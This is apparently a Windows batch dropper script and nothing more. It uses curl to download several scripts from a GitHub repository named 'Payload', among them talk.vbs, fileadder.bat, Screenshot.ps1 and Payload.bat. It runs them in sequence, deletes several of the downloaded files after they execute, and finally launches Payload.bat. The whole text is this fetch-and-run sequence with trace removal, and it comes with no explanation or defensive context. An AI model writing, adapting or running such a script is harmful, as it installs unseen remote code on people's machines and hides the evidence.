curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/talk.vbs
curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/talk1.vbs
curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/fileadder.bat
curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/Screenshot.ps1
curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/Payload.bat
curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/start.bat
start talk.vbs
start fileadder.bat
timeout 3 > nul
del /f /q "talk.vbs"
del /f /q "fileadder.bat"
del /f /q "Screenshot.ps1"
start talk1.vbs
timeout 6 > nul
del /f /q "talk1.vbs"
start Payload.bat
